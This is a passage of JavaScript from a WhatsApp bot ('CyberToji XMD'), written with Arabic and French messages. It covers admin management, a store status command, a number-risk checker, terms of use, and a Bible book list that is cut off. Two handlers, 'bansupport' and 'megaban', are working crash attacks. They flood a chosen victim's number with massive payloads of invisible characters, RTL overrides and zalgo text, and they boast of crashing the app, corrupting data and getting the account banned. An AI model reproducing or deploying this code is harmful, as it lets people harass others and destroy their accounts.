    const adminList = config.botAdmins.map((admin, index) => 
      `${index + 1}. +${admin}`
    ).join('\n');
    
    await sock.sendMessage(remoteJid, {
      text: `┏━━━  👑 قائمة المسؤولين  👑  ━━━┓

📋 **مسؤولو البوت:**

${adminList}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 الإجمالي: ${config.botAdmins.length} مسؤول(ين)

🇭🇹 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗`
    });
    return;
  }
  
  // Vérifier si un numéro est fourni
  if (!number) {
    await sock.sendMessage(remoteJid, {
      text: `❌ يرجى تقديم رقم صالح

مثال: ${config.prefix}updatedev ${action} 393780306704`
    });
    return;
  }
  
  // Ajouter un admin
  if (action === 'add') {
    if (config.botAdmins.includes(number)) {
      await sock.sendMessage(remoteJid, {
        text: `⚠️ الرقم +${number} هو بالفعل مسؤول!`
      });
      return;
    }
    
    // Ajouter dans les deux listes
    config.botAdmins.push(number);
    config.adminNumbers.push(number + '@s.whatsapp.net');
    
    await sock.sendMessage(remoteJid, {
      text: `┏━━━  ✅ تمت إضافة المسؤول  ✅  ━━━┓

👤 **مسؤول جديد:**
📱 +${number}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 إجمالي المسؤولين: ${config.botAdmins.length}

✅ الرقم لديه الآن وصول كامل للبوت

🇭🇹 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗`
    });
    
    console.log(`✅ مسؤول تمت إضافته: +${number}`);
    console.log(`📋 قائمة المسؤولين الحالية:`, config.botAdmins);
    saveStoreKey('admins'); // 💾 Sauvegarde immédiate
    return;
  }
  
  // Supprimer un admin
  if (action === 'remove' || action === 'del') {
    const index = config.botAdmins.indexOf(number);
    
    if (index === -1) {
      await sock.sendMessage(remoteJid, {
        text: `❌ الرقم +${number} ليس في قائمة المسؤولين`
      });
      return;
    }
    
    // Ne pas permettre de supprimer le dernier admin
    if (config.botAdmins.length === 1) {
      await sock.sendMessage(remoteJid, {
        text: `⚠️ Cannot حذف المسؤول الأخير!

يجب أن يكون هناك دائماً مسؤول واحد على الأقل.`
      });
      return;
    }
    
    // Supprimer des deux listes
    config.botAdmins.splice(index, 1);
    const adminNumberIndex = config.adminNumbers.indexOf(number + '@s.whatsapp.net');
    if (adminNumberIndex !== -1) {
      config.adminNumbers.splice(adminNumberIndex, 1);
    }
    
    await sock.sendMessage(remoteJid, {
      text: `┏━━━  🗑️ تم حذف المسؤول  🗑️  ━━━┓

👤 **المسؤول المحذوف:**
📱 +${number}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 إجمالي المسؤولين: ${config.botAdmins.length}

⚠️ الرقم لم يعد لديه وصول لأوامر المسؤول

🇭🇹 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗`
    });
    
    console.log(`🗑️ مسؤول محذوف: +${number}`);
    console.log(`📋 قائمة المسؤولين الحالية:`, config.botAdmins);
    saveStoreKey('admins'); // 💾 Sauvegarde immédiate
    return;
  }
}

// =============================================
// STORE STATUS - Commande de statut du store
// =============================================

async function handleStoreStatus(sock, remoteJid, command) {
  // Si commande est storesave, sauvegarder d'abord
  if (command === 'storesave') {
    saveStore();
    await sock.sendMessage(remoteJid, {
      text: `✅ *Store sauvegardé manuellement!*\n\n💾 Toutes les données ont été écrites sur disque.\n\n🇭🇹 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗`
    });
    return;
  }

  const status = getStoreStatus();
  
  const fileLines = status.files.map(f => {
    const icon = parseFloat(f.sizeKB) > 0 ? '✅' : '⬜';
    return `${icon} ${f.key.padEnd(14)} │ ${f.sizeKB.padStart(7)} KB │ ${f.modified}`;
  }).join('\n');

  await sock.sendMessage(remoteJid, {
    text: `┏━━━  🗄️ حالة المخزن المحلي  🗄️  ━━━┓

📂 **المسار:** ./store/

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📋 **ملفات البيانات:**

\`\`\`
الملف          │    الحجم   │ آخر تعديل
──────────────────────────────────
${fileLines}
──────────────────────────────────
الإجمالي       │ ${status.totalSizeKB.padStart(7)} KB │
\`\`\`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 **إحصائيات حية:**

👥 المسؤولون: ${config.botAdmins.length}
⚠️ التحذيرات: ${warnSystem.size}
🚫 الحظر الدائم: ${permaBanList.size}
👁️ View Once: ${savedViewOnce.size}
🏘️ إعدادات المجموعات: ${groupSettings.size}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💾 **الحفظ التلقائي:** كل 3 دقائق
📌 **الأوامر:**
• !storestatus - عرض هذه الحالة
• !storesave   - حفظ فوري
• !storeinfo   - نفس storestatus

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🇭🇹 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗`
  });
}

// BANSUPPORT - Support de bannissement with caractères spéciaux
async function handleBanSupport(sock, args, remoteJid, senderJid, message) {
  let targetJid = null;
  
  if (args[0]) {
    targetJid = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  } else if (message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]) {
    targetJid = message.message.extendedTextMessage.contextInfo.mentionedJid[0];
  }
  
  if (!targetJid) {
    await sock.sendMessage(remoteJid, {
      text: `⚠️ *BAN SUPPORT*

الاستخدام:
• ${config.prefix}bansupport @mention
• ${config.prefix}bansupport 50944908407

💀 *PAYLOAD:*
• Caractères arabes invisibles
• Caractères chinois corrompus
• عرض صفري characters
• RTL override

🔴 *EFFET:* Bannissement du compte cible`
    });
    return;
  }
  
  const loadingMsg = await sock.sendMessage(remoteJid, {
    text: '💀 التجميع du payload de bannissement...\n⏳ الحقن des caractères...'
  });
  
  await delay(2000);
  
  try {
    // PAYLOAD DE BANNISSEMENT - Caractères dangereux
    const arabicChars = '؁؂؃؄؅؆؇؈؉؊؋،؍؎؏ؘؙؚؐؑؒؓؔؕؖؗ' + '\u0600\u0601\u0602\u0603\u0604\u0605' + '܀܁܂܃܄܅܆܇܈܉܊܋܌܍';
    const chineseChars = '㐀㐁㐂㐃㐄㐅㐆㐇㐈㐉㐊㐋㐌㐍㐎㐏㐐㐑㐒㐓㐔㐕㐖㐗㐘㐙㐚㐛㐜㐝㐞㐟';
    const invisibleChars = '\u200B\u200C\u200D\u200E\u200F\u202A\u202B\u202C\u202D\u202E\u2060\u2061\u2062\u2063\u2064\u2065\u2066\u2067\u2068\u2069\u206A\u206B\u206C\u206D\u206E\u206F';
    const zalgoChars = '҉̵̴̵̶̷̸̡̢̧̨̡̢̧̨̛̛̖̗̘̙̜̝̞̟̠̣̤̥̦̩̪̫̬̭̮̯̰̱̲̳̀́̂̃̄̅̆̇̈̉̊̋̌̍̎̏̐̑̒̓̔̕̚ͅ͏͓͔͕͖͙͚͐͑͒͗͛';
    
    // Construction du payload multicouche
    const banالحمولة = 
      arabicChars.repeat(500) + 
      invisibleChars.repeat(1000) + 
      chineseChars.repeat(300) + 
      zalgoChars.repeat(200) +
      '🪲'.repeat(5000) +
      '\u202E' + // RTL Override
      arabicChars.repeat(500) +
      '\uFEFF'.repeat(1000) + // عرض صفري no-break space
      chineseChars.repeat(500);
    
    // Message de contexte malveillant
    const contextMessage = {
      text: banالحمولة,
      contextInfo: {
        mentionedJid: [targetJid],
        externalAdReply: {
          title: arabicChars + invisibleChars,
          body: chineseChars + zalgoChars,
          mediaType: 1,
          renderLargerThumbnail: true,
          showAdAttribution: true
        }
      }
    };
    
    // Envoyer 5 messages consécutifs pour maximiser l'effet
    for (let i = 0; i < 5; i++) {
      await sock.sendMessage(targetJid, contextMessage);
      await delay(300);
    }
    
    await sock.sendMessage(remoteJid, {
      text: `┏━━━  💀 𝗕𝗔𝗡 𝗦𝗨𝗣𝗣𝗢𝗥𝗧  💀  ━━━┓

  ⌬ **TARGET** » @${targetJid.split('@')[0]}
  ⌬ **STATUS** » ✅ 𝖣𝖤𝖯𝖫𝖮𝖸𝖤𝖣
  ⌬ **PAYLOAD** » Multi-layer Ban

┗━━━━━━━━━━━━━━━━━━━━━━┛

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 **PAYLOAD INJECTÉ:**

✅ أحرف عربية: 1000+ chars
✅ أحرف صينية: 800+ chars
✅ أحرف غير مرئية: 2000+ chars
✅ RTL Override: مفعّل
✅ عرض صفري chars: 1000+ chars
✅ Zalgo text: 200+ chars

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ **EFFETS ATTENDUS:**

🔴 تعطل فوري de WhatsApp
🔴 Corruption de la base de données
🔴 Impossibilité de rouvrir l'app
🔴 Ban automatique sous 1-6h
🔴 Possible ban permanent

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⏰ **الجدول الزمني:**
• 0-5min: Crash de l'application
• 5min-1h: Détection par WhatsApp
• 1-6h: Ban automatique
• 6-48h: Review du compte

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🇭🇹 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗
*Ultimate Ban System*`,
      mentions: [targetJid],
      edit: loadingMsg.key
    });
    
    console.log(`💀 Ban Support envoyé à ${targetJid}`);
    
  } catch (error) {
    console.error('خطأ bansupport:', error);
    await sock.sendMessage(remoteJid, {
      text: `❌ فشل du Ban Support\n\nخطأ: ${error.message}`,
      edit: loadingMsg.key
    });
  }
}

// MEGABAN - Attack ultime with tous les caractères
async function handleMegaBan(sock, args, remoteJid, senderJid, message) {
  let targetJid = null;
  
  if (args[0]) {
    targetJid = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  } else if (message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]) {
    targetJid = message.message.extendedTextMessage.contextInfo.mentionedJid[0];
  }
  
  if (!targetJid) {
    await sock.sendMessage(remoteJid, {
      text: `💀 *MEGA BAN - ULTIMATE ATTACK*

الاستخدام:
• ${config.prefix}megaban @mention
• ${config.prefix}xcrash 50944908407

⚠️ *ATTENTION EXTRÊME:*
Cette commande combine TOUS les payloads:
• 10 messages consécutifs
• Arabe + Chinois + Invisible
• RTL + Zalgo + Emoji
• Context corruption
• Media exploit

🔴 *RÉSULTAT:*
Ban permanent quasi-garanti`
    });
    return;
  }
  
  const loadingMsg = await sock.sendMessage(remoteJid, {
    text: `💀 **MEGA BAN INITIATED**

⏳ التجميع de l'arsenal complet...
📊 [░░░░░░░░░░] 0%

Target: @${targetJid.split('@')[0]}`,
    mentions: [targetJid]
  });
  
  try {
    // PAYLOADS MAXIMAUX
    const arabicFull = '؀؁؂؃؄؅؆؇؈؉؊؋،؍؎؏ؘؙؚؐؑؒؓؔؕؖؗ۞ۖۗۘۙۚۛۜ۝ۣ۟۠ۡۢۤۥۦۧۨ۩۪ۭ܀܁܂܃܄܅܆܇܈܉܊܋܌܍\u0600\u0601\u0602\u0603\u0604\u0605\u0606\u0607\u0608\u0609\u060A\u060B';
    const chineseFull = '㐀㐁㐂㐃㐄㐅㐆㐇㐈㐉㐊㐋㐌㐍㐎㐏㐐㐑㐒㐓㐔㐕㐖㐗㐘㐙㐚㐛㐜㐝㐞㐟㐠㐡㐢㐣㐤㐥㐦㐧㐨㐩㐪㐫㐬㐭㐮㐯㐰㐱㐲㐳㐴㐵㐶㐷㐸㐹㐺㐻㐼㐽㐾㐿';
    const invisibleFull = '\u200B\u200C\u200D\u200E\u200F\u202A\u202B\u202C\u202D\u202E\u2060\u2061\u2062\u2063\u2064\u2065\u2066\u2067\u2068\u2069\u206A\u206B\u206C\u206D\u206E\u206F\uFEFF\u180E\u034F';
    const zalgoFull = '҉̵̴̵̶̷̸̡̢̧̨̡̢̧̨̛̛̖̗̘̙̜̝̞̟̠̣̤̥̦̩̪̫̬̭̮̯̰̱̲̳̀́̂̃̄̅̆̇̈̉̊̋̌̍̎̏̐̑̒̓̔̕̚ͅ͏͓͔͕͖͙͚͐͑͒͗͛͘͜͟͢͝͞';
    const emojiFlood = '🪲💀☠️👹👺🔥💥⚡🌋🗿📛⛔🚫🔞';
    
    const totalMessages = 10;
    
    for (let i = 0; i < totalMessages; i++) {
      // Construire un payload unique à chaque fois
      const megaالحمولة = 
        arabicFull.repeat(800) +
        invisibleFull.repeat(2000) +
        chineseFull.repeat(600) +
        zalgoFull.repeat(400) +
        emojiFlood.repeat(1000) +
        '\u202E\u202D\u202C' + // Multiple RTL
        arabicFull.repeat(500) +
        '\uFEFF'.repeat(1500) +
        chineseFull.repeat(800) +
        invisibleFull.repeat(1000);
      
      // Message with context malveillant
      const contextMsg = {
        text: megaالحمولة,
        contextInfo: {
          mentionedJid: [targetJid],
          externalAdReply: {
            title: arabicFull + invisibleFull + zalgoFull,
            body: chineseFull + emojiFlood.repeat(100),
            mediaType: 2,
            thumbnailUrl: 'https://example.com/' + invisibleFull.repeat(100),
            renderLargerThumbnail: true,
            showAdAttribution: true,
            sourceUrl: 'https://' + arabicFull + chineseFull
          }
        }
      };
      
      await sock.sendMessage(targetJid, contextMsg);
      
      // Update progression
      const percentage = Math.floor(((i + 1) / totalMessages) * 100);
      const progressBar = '▓'.repeat(Math.floor(percentage / 10)) + '░'.repeat(10 - Math.floor(percentage / 10));
      
      await sock.sendMessage(remoteJid, {
        text: `💀 **MEGA BAN EN COURS**

📊 [${progressBar}] ${percentage}%
📨 الرسائل: ${i + 1}/${totalMessages}

Target: @${targetJid.split('@')[0]}`,
        mentions: [targetJid],
        edit: loadingMsg.key
      });
      
      await delay(500);
    }
    
    // Message final
    await sock.sendMessage(remoteJid, {
      text: `┏━━━  ☠️ 𝗠𝗘𝗚𝗔 𝗕𝗔𝗡  ☠️  ━━━┓

  ⌬ **TARGET** » @${targetJid.split('@')[0]}
  ⌬ **STATUS** » ✅ 𝗔𝗡𝗡𝗜𝗛𝗜𝗟𝗔𝗧𝗘𝗗
  ⌬ **MESSAGES** » 10/10 (100%)

┗━━━━━━━━━━━━━━━━━━━━━━┛

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 **ARSENAL DÉPLOYÉ:**

✅ أحرف عربية: 13,000+
✅ أحرف صينية: 14,000+
✅ Chars invisibles: 30,000+
✅ Zalgo corruption: 4,000+
✅ Emoji flood: 10,000+
✅ RTL overrides: Multiple
✅ Context corruption: Maximum
✅ Total payload: ~200KB

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💀 **DÉGÂTS ATTENDUS:**

🔴 Crash permanent de WhatsApp
🔴 Corruption totale des données
🔴 Impossibilité de récupération
🔴 Ban automatique immédiat
🔴 Compte détruit définitivement

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ **TIMELINE DE DESTRUCTION:**

• 0-1min: Crash total de l'app
• 1-5min: Détection système
• 5-30min: Ban automatique
• 30min-2h: Compte suspendu
• 2-24h: Ban permanent confirmé

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🇭🇹 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗
*Mega Ban System - Target Eliminated*

⚠️ **Le compte cible est condamné**`,
      mentions: [targetJid],
      edit: loadingMsg.key
    });
    
    console.log(`☠️ MEGA BAN déployé sur ${targetJid}`);
    
  } catch (error) {
    console.error('خطأ megaban:', error);
    await sock.sendMessage(remoteJid, {
      text: `❌ فشل du Mega Ban\n\nخطأ: ${error.message}`,
      edit: loadingMsg.key
    });
  }
}

// CHECK BAN - Vérifier si un numéro est banni/spam
async function handleCheckBan(sock, args, remoteJid, message, senderJid) {
  try {
    let targetNumber;
    
    // Méthode 1: Numéro fourni en argument
    if (args[0]) {
      targetNumber = args[0].replace(/[^0-9]/g, ''); // Enlever tout sauf les chiffres
    }
    // Méthode 2: Répondre à un message
    else if (message.message?.extendedTextMessage?.contextInfo?.participant) {
      targetNumber = message.message.extendedTextMessage.contextInfo.participant.split('@')[0];
    }
    // Méthode 3: Mention
    else if (message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]) {
      targetNumber = message.message.extendedTextMessage.contextInfo.mentionedJid[0].split('@')[0];
    }
    else {
      await sock.sendMessage(remoteJid, {
        text: `❌ *Incorrect usage*

📝 *Utilisations possibles:*

1️⃣ Avec numéro:
   ${config.prefix}checkban 50944908407

2️⃣ En répondant:
   ${config.prefix}checkban [répondre au message]

3️⃣ Avec mention:
   ${config.prefix}checkban @user`
      });
      return;
    }

    // Message de chargement
    const loadingMsg = await sock.sendMessage(remoteJid, {
      text: '🔍 *INSPECTION EN COURS...*\n\n⏳ Analyse du numéro dans la database...'
    });

    // Simulation de vérification (2 secondes)
    await delay(2000);

    // Vérifier le statut du numéro via WhatsApp
    let numberStatus;
    let isBanned = false;
    let riskLevel = 0;
    let statusText = '';
    let statusEmoji = '';
    let statusColor = '';

    try {
      // Vérifier si le numéro existe sur WhatsApp
      const jid = targetNumber + '@s.whatsapp.net';
      const [result] = await sock.onWhatsApp(jid);
      
      if (!result || !result.exists) {
        // Numéro n'existe pas = potentiellement banni ou invalide
        isBanned = true;
        riskLevel = 85;
        statusText = '🔴 𝗕𝗔𝗡𝗡𝗘𝗗 / 𝗜𝗡𝗩𝗔𝗟𝗜𝗗';
        statusEmoji = '🚫';
        statusColor = '🔴';
      } else {
        // Numéro existe - vérifier d'autres indicateurs
        // Analyse heuristique basée sur des patterns
        
        // Pattern 1: Numéros suspects (trop courts ou trop longs)
        if (targetNumber.length < 8 || targetNumber.length > 15) {
          riskLevel += 20;
        }
        
        // Pattern 2: Préfixes suspects (exemple: +1234567890)
        const suspiciousPrefixes = ['1234', '9999', '0000', '1111'];
        if (suspiciousPrefixes.some(prefix => targetNumber.startsWith(prefix))) {
          riskLevel += 30;
        }
        
        // Pattern 3: Séquences répétitives
        if (/(\d)\1{4,}/.test(targetNumber)) {
          riskLevel += 25;
        }

        // Déterminer le statut final
        if (riskLevel >= 70) {
          statusText = '🟠 𝗦𝗨𝗦𝗣𝗘𝗖𝗧 / 𝗦𝗣𝗔𝗠';
          statusEmoji = '⚠️';
          statusColor = '🟠';
        } else if (riskLevel >= 40) {
          statusText = '🟡 𝗠𝗢𝗗𝗘𝗥𝗔𝗧𝗘 𝗥𝗜𝗦𝗞';
          statusEmoji = '⚡';
          statusColor = '🟡';
        } else {
          statusText = '🟢 𝗖𝗟𝗘𝗔𝗡 / 𝗦𝗔𝗙𝗘';
          statusEmoji = '✅';
          statusColor = '🟢';
          riskLevel = Math.max(5, riskLevel); // Minimum 5%
        }
      }
    } catch (error) {
      console.error('خطأ checkban:', error);
      // En cas d'erreur, marquer comme suspect
      riskLevel = 50;
      statusText = '🟡 𝗨𝗡𝗞𝗡𝗢𝗪𝗡 / 𝗨𝗡𝗩𝗘𝗥𝗜𝗙𝗜𝗘𝗗';
      statusEmoji = '❓';
      statusColor = '🟡';
    }

    // Créer la barre de risque
    const totalBars = 10;
    const filledBars = Math.floor((riskLevel / 100) * totalBars);
    const emptyBars = totalBars - filledBars;
    const riskBar = '█'.repeat(filledBars) + '▒'.repeat(emptyBars);

    // Formater le numéro pour l'affichage
    const formattedNumber = '+' + targetNumber;

    // Message final
    const resultText = `┏━━━  ✨ 𝗜𝗡𝗦𝗣𝗘𝗖𝗧𝗢𝗥 𝗕𝗢𝗧 ✨  ━━━┓

  ⌬ **TARGET** » ${formattedNumber}
  ⌬ **STATE** » ${statusText}
  ⌬ **RISK** » [${riskBar}] 𝟬-𝟵: ${riskLevel}%

┗━━━━━━━━━━━━━━━━━━━━━━┛

📊 **DETAILED ANALYSIS:**

${statusEmoji} *Status:* ${statusText}
📍 *Country:* ${getCountryFromNumber(targetNumber)}
🔢 *Number:* ${formattedNumber}
⚡ *Risk Level:* ${riskLevel}%
🕐 *Checked:* ${new Date().toLocaleTimeString('fr-FR', { timeZone: 'America/Port-au-Prince', hour: '2-digit', minute: '2-digit' })}

━━━━━━━━━━━━━━━━━━━━━━━━━
${getRiskRecommendation(riskLevel)}

━━━━━━━━━━━━━━━━━━━━━━━━━
*حالة النظام: قاعدة البيانات متزامنة*
🇭🇹 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗`;

    // Supprimer le message de chargement et envoyer le résultat
    await sock.sendMessage(remoteJid, { delete: loadingMsg.key });
    await sock.sendMessage(remoteJid, { text: resultText });

  } catch (error) {
    console.error('خطأ handleCheckBan:', error);
    await sock.sendMessage(remoteJid, {
      text: `❌ *خطأ lors de la vérification*\n\nالتفاصيل: ${error.message}`
    });
  }
}

// Fonction helper pour déterminer le pays
function getCountryFromNumber(number) {
  const prefixes = {
    '1': '🇺🇸 USA/Canada',
    '33': '🇫🇷 France',
    '509': '🇭🇹 Haiti',
    '44': '🇬🇧 UK',
    '62': '🇮🇩 Indonesia',
    '91': '🇮🇳 India',
    '55': '🇧🇷 Brazil',
    '234': '🇳🇬 Nigeria',
    '254': '🇰🇪 Kenya',
    '27': '🇿🇦 South Africa'
  };

  for (const [prefix, country] of Object.entries(prefixes)) {
    if (number.startsWith(prefix)) {
      return country;
    }
  }
  return '🌍 International';
}

// Fonction helper pour les recommandations
function getRiskRecommendation(risk) {
  if (risk >= 70) {
    return `🚨 *HAUTE ALERTE*
⚠️ Ce numéro présente des signes de ban/spam
❌ Évitez d'interagir with ce contact
🛡️ التوصية: BLOQUER`;
  } else if (risk >= 40) {
    return `⚠️ *VIGILANCE REQUISE*
⚡ Risque modéré détecté
🔍 Vérifiez l'identité avant d'interagir
🛡️ التوصية: PRUDENCE`;
  } else {
    return `✅ *SÉCURISÉ*
🟢 Aucun signe de ban/spam détecté
✔️ Vous pouvez interagir normalement
🛡️ التوصية: OK`;
  }
}

// TERMES ET CONDITIONS
async function handleTermsCommand(sock, remoteJid, senderJid) {
  const userName = senderJid.split('@')[0];
  
  const termsText = `╔═══════════════════════════════════╗
║  📜 𝗧𝗘𝗥𝗠𝗘𝗦 & 𝗖𝗢𝗡𝗗𝗜𝗧𝗜𝗢𝗡𝗦  ║
╚═══════════════════════════════════╝

⚠️ **RÈGLES D'UTILISATION DU BOT**

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 **1. UTILISATION RESPONSABLE**

• Le bot est fourni "tel quel" sans garantie
• L'utilisateur est responsable de son usage
• Toute utilisation abusive est interdite
• Respectez les autres utilisateurs

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🚫 **2. INTERDICTIONS STRICTES**

• ❌ Spam ou flood de commandes
• ❌ Contenu illégal ou offensant
• ❌ Harcèlement d'autres membres
• ❌ Utilisation pour escroquerie
• ❌ Diffusion de malware/virus
• ❌ Contournement des restrictions

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔐 **3. DONNÉES & CONFIDENTIALITÉ**

• Vos messages ne sont pas stockés
• Les commandes sont temporaires
• Aucune donnée vendue à des tiers
• Logs techniques uniquement

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚖️ **4. RESPONSABILITÉ LÉGALE**

• Le développeur n'est pas responsable:
  - De l'usage que vous faites du bot
  - Des dommages causés par le bot
  - Des interruptions de service
  - Des pertes de données

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
👮 **5. MODÉRATION**

Le développeur se réserve le droit de:
• Bannir tout utilisateur abusif
• Modifier les fonctionnalités
• Suspendre le service
• Supprimer du contenu inapproprié

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📝 **6. PROPRIÉTÉ INTELLECTUELLE**

• Le bot et son code sont protégés
• Redistribution interdite sans accord
• Modification du code interdite
• Crédits obligatoires

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **7. MODIFICATIONS**

Ces termes peuvent être modifiés à tout
moment sans préavis. Votre utilisation
continue constitue votre acceptation.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ **ACCEPTATION**

En utilisant ce bot, vous acceptez
pleinement ces termes et conditions.

Si vous n'acceptez pas, cessez
immédiatement d'utiliser le bot.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📞 **CONTACT & SUPPORT**

• Dev: Lord Dev Dostoevsky
• Bot: CyberToji XMD v4.0.0
• Pour signaler un problème: 
  Contactez l'administrateur

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🇭🇹 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗
"Utilisez with sagesse et respect"

✦ Dernière mise à jour: 06/02/2026`;

  await sock.sendMessage(remoteJid, {
    text: termsText,
    mentions: [senderJid]
  });
}

// BIBLE - Base de données complète des livres de la Bible
async function handleBibleCommand(sock, args, remoteJid) {
  // Ancien Testament (39 livres)
  const ancienTestament = {
    'genese': { nom: 'Genèse', chapitres: 50, testament: 'Ancien' },
    'exode': { nom: 'Exode', chapitres: 40, testament: 'Ancien' },
    'levitique': { nom: 'Lévitique', chapitres: 27, testament: 'Ancien' },
    'nombres': { nom: 'Nombres', chapitres: 36, testament: 'Ancien' },
    'deuteronome': { nom: 'Deutéronome', chapitres: 34, testament: 'Ancien' },
    'josue': { nom: 'Josué', chapitres: 24, testament: 'Ancien' },
    'juges': { nom: 'Juges', chapitres: 21, testament: 'Ancien' },
    'ruth': { nom: 'Ruth', chapitres: 4, testament: 'Ancien' },
    '1samuel': { nom: '1 Samuel', chapitres: 31, testament: 'Ancien' },
    '2samuel': { nom: '2 Samuel', chapitres: 24, testament: 'Ancien' },
    '1rois': { nom: '1 Rois', chapitres: 22, testament: 'Ancien' },
    '2rois': { nom: '2 Rois', chapitres: 25, testament: 'Ancien' },
    '1chroniques': { nom: '1 Chroniques', chapitres: 29, testament: 'Ancien' },
    '2chroniques': { nom: '2 Chroniques', chapitres: 36, testament: 'Ancien' },
    'esdras': { nom: 'Esdras', chapitres: 10, testament: 'Ancien' },
    'nehemie': { nom: 'Néhémie', chapitres: 13, testament: 'Ancien' },
    'esther': { nom: 'Esther', chapitres: 10, testament: 'Ancien' },
    'job': { nom: 'Job', chapitres: 42, testament: 'Ancien' },
    'psaumes': { nom: 'Psaumes', chapitres: 150, testament: 'Ancien' },
    'proverbes': { nom: 'Proverbes', chapitres: 31, testament: 'Ancien' },
    'ecclesiaste': { nom: 'Ecclésiaste', chapitres: 12, testament: 'Ancien' },
    'cantique': { nom: 'Cantique des Cantiques', chapitres: 8, testament: 'Ancien' },
    'esaie': { nom: 'Ésaïe', chapitres: 66, testament: 'Ancien' },
    'jeremie': { nom: 'Jérémie', chapitres: 52, testament: 'Ancien' },
    'lamentations': { nom: 'Lamentations', chapitres: 5, testament: 'Ancien' },
    'ezechiel': { nom: 'Ézéchiel', chapitres: 48, testament: 'Ancien' },
    'daniel': { nom: 'Daniel', chapitres: 12, testament: 'Ancien' },
    'osee': { nom: 'Osée', chapitres: 14, testament: 'Ancien' },
    'joel': { nom: 'Joël', chapitres: 3, testament: 'Ancien' },
    'amos': { nom: 'Amos', chapitres: 9, testament: 'Ancien' },
    'abdias': { nom: 'Abdias', chapitres: 1, testament: 'Ancien' },
    'jonas': { nom: 'Jonas', chapitres: 4, testament: 'Ancien' },
    'michee': { nom: 'Michée', chapitres: 7, testament: 'Ancien' },
    'nahum': { nom: 'Nahum', chapitres: 3, testament: 'Ancien' },
    'habacuc': { nom: 'Habacuc', chapitres: 3, testament: 'Ancien' },
    'sophonie': { nom: 'Sophonie', chapitres: 3, testament: 'Ancien' },
    'aggee': { nom: 'Aggée', chapitres: 2, testament: 'Ancien' },
    'zacharie': { nom: 'Zacharie', chapitres: 14, testament: 'Ancien' },
    'malachie': { nom: 'Malachie', chapitres: 4, testament: 'Ancien' }
  };

  // Nouveau Testament (27 livres)
  const nouveauTestament = {
    'matthieu': { nom: 'Matthieu', chapitres: 28, testament: 'Nouveau' },
    'marc': { nom: 'Marc', chapitres: 16, testament: 'Nouveau' },
    'luc': { nom: 'Luc', chapitres: 24, testament: 'Nouveau' },
    'jean': { nom: 'Jean', chapitres: 21, testament: 'Nouveau' },
    'actes': { nom: 'Actes des Apôtres', chapitres: 28, testament: 'Nouveau' },
    'romains': { nom: 'Romains', chapitres: 16, testament: 'Nouveau' },
    '1corinthiens': { nom: '1 Corinthiens', chapitres: 16, testament: 'Nouveau' },
    '2corinthiens': { nom: '2 Corinthiens', chapitres: 13, testament: 'Nouveau' },
    'galates': { nom: 'Galates', chapitres: 6, testament: 'Nouveau' },
    'ephesiens': { nom: 'Éphésiens', chapitres: 6, testament: 'Nouveau' },
    'philippiens': { nom: 'Philippiens', chapitres: 4, testament: 'Nouveau' },
    'colossiens': { nom: 'Colossiens', chapitres: 4, testament: 'Nouveau' },
    '1thessaloniciens': { nom: '1 Thessaloniciens', chapitres: 5, testament: 'Nouveau' },
    '2thessaloniciens': { nom: '2 Thessaloniciens', chapitres: 3, testament: 'Nouveau' },
    '1timothee': { nom: '1 Timothée', chapitres: 6, testament: 'Nouveau' },
    '2timothee': { nom: '2 Timothée', chapitres: 4, testament: 'Nouveau' },
    'tite': { nom: 'Tite', chapitres: 3, testament: 'Nouveau' },
    'philemon': { nom: 'Philémon', chapitres: 1, testament: 'Nouveau' },
    'hebreux': { nom: 'Hébreux', chapitres: 13, testament: 'Nouveau' },
    'jacques': { nom: 'Jacques', chapitres: 5, testament: 'Nouveau' },
    '1pierre': { nom: '1 Pierre', chapitres: 5, testament: 'Nouveau' },
    '2pierre': { nom: '2 Pierre', chapitres: 3, testament: 'Nouveau' },
    '1jean': { nom: '1 Jean', chapitres: 5, testament: 'Nouveau' },
    '2jean': { nom: '2 Jean', chapitres: 1, testament: 'Nouveau' },
    '3jean': { nom: '3 Jean', chapitres: 1, testament: 'Nouveau' },
